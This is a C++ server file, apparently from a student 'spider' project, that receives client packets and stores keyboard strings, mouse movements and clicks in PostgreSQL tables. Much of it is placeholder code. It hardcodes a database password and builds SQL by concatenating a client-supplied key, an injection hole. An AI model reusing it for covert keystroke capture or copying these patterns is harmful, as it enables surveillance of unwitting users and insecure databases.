//
// SqlServer.cpp for sqlServer in /home/debrab_t/rendu/TEK3/cpp_spider/bdd_connect
//
// Made by debrab_t
// Login   <debrab_t@epitech.net>
//
// Started on  Mon Nov  7 10:23:09 2016 debrab_t
// Last update Wed Nov  9 16:34:19 2016 debrab_t
//

#include "socket/serverTcpSocket.hpp"

SqlServer::SqlServer()
{
  feedPointMap();
  dbConnect("dbname=postgres user=postgres password=abcd hostaddr=127.0.0.1 port=5432");
  createServTab();
}

SqlServer::~SqlServer()
{

}

bool	SqlServer::dbConnect(std::string const &con)
{
  return (sqlMan.connect(con));
}


void	SqlServer::createServTab()
{
  sqlMan.createTable("CLIENT",
		     "ID  SERIAL PRIMARY KEY,"		\
		     "ID_CLIENT	INT NOT NULL,"		\
		     "PUBLICKEY TEXT NOT NULL");
  sqlMan.createTable("MOUSE_MOUVEMENT",
		     "ID  SERIAL PRIMARY KEY,"		      \
		     "ID_CLIENT INT NOT NULL,"		      \
		     "TIMESTAMP TEXT NOT NULL,"		      \
		     "X INT NOT NULL,"			      \
		     "Y INT NOT NULL");
  sqlMan.createTable("MOUSE_CLICK",
		     "ID  SERIAL PRIMARY KEY,"		      \
		     "ID_CLIENT INT NOT NULL,"		      \
		     "TIMESTAMP TEXT NOT NULL,"		      \
		     "X INT NOT NULL,"			      \
		     "Y INT NOT NULL,"			      \
		     "ID_CLICK INT NOT NULL");
  sqlMan.createTable("KEYBOARD_STRING",
		     "ID  SERIAL PRIMARY KEY,"	\
		     "ID_CLIENT INT NOT NULL,"	\
		     "STRING TEXT NOT NULL");
}

void		SqlServer::addClient(spider::PacketUnserializer &packet)
{
  PackageCMDIDN	idn;
  std::string	data;
  pqxx::result	reqResult;

  idn = packet.getData<PackageCMDIDN>();
  data = std::to_string(idn.id) + ", " + "'" + std::string(idn.key) + "'";
  std::cout << "addClient--->" << data << std::endl;
  reqResult= sqlMan.selectData("id_client", "client where id_client=" + std::to_string(idn.id));
  /*  if ()
  for (pqxx::result::const_iterator c = r.begin(); c != r.end(); ++c)
    {
      std::cout << "ID = " << c[0] << std::endl;
      }*/
  sqlMan.insertData("CLIENT",
		    "ID_CLIENT, PUBLICKEY",
		    data);
}

void	SqlServer::addMouseMouvement(spider::PacketUnserializer &packet)
{
  PackageCMDMouseMove	mvt;

  mvt = packet.getData<PackageCMDMouseMove>();
  sqlMan.insertData("MOUSE_MOUVEMENT",
		    "ID_CLIENT, TIMESTAMP, X, Y",
		    "1, 'timestamp test', 8, 2");
}

void	SqlServer::addMouseClick(spider::PacketUnserializer &packet)
{
  PackageCMDMouseClic clc;

  clc = packet.getData<PackageCMDMouseClic>();
  sqlMan.insertData("MOUSE_CLICK",
		    "ID_CLIENT, TIMESTAMP, X, Y, ID_CLICK",
		    "1, 'timestamp test', 8, 2, 3");
}

void	SqlServer::addKeyboardString(spider::PacketUnserializer &packet)
{
  PackageCMDKeyboardTouch	toc;

  toc = packet.getData<PackageCMDKeyboardTouch>();
  sqlMan.insertData("KEYBOARD_STRING",
		    "ID_CLIENT, STRING",
		    "1, 'string test'");
}

void	SqlServer::feedPointMap()
{
  _pointMap.insert(std::pair<std::string,bddFunc>("idn", &SqlServer::addClient));
  _pointMap.insert(std::pair<std::string,bddFunc>("clc", &SqlServer::addMouseClick));
  _pointMap.insert(std::pair<std::string,bddFunc>("mvt", &SqlServer::addMouseMouvement));
  _pointMap.insert(std::pair<std::string,bddFunc>("toc", &SqlServer::addKeyboardString));
  _pointMap.insert(std::pair<std::string,bddFunc>("dec",  &SqlServer::disconnectClient));
}

void	SqlServer::disconnectClient(spider::PacketUnserializer &packet)
{

}

bool		SqlServer::putIntoBdd(spider::PacketUnserializer &packet,
				      std::shared_ptr<spider::socket::user> user)
{
  /*
  Test msg;
  memset(&msg.str[0], 0, 100);
  std::strncpy(msg.cmd, "tst", 3);
  spider::PacketSerializer<Test> _packet(sizeof(PackageHeader) + sizeof(Test), 1999888256, msg);

  user->write<Test>(_packet);
  */


  /*
    TODO
    les structures sont-elles verifié ?

    - connection initialisation
    - methode disconnect client
    - verifier à chaque fois que l'id existe (return false si non)
    - write les réponses de retour (add user remplir le packageAnswer avec la cmd)
    - verifier les const dans les methodes
    - mettre les cliens à STATE = FALSE quand ils sont déconnecté si le serveur se quite
    - creer database s'il elle n'existe pas
  */
  std::string	stringPacket(packet.getPacketType(), 0, 3);
  if (_pointMap.find(stringPacket) != _pointMap.end())
    {
      ((*this).*_pointMap.find(stringPacket)->second)(packet);
    }
  return (true);
}
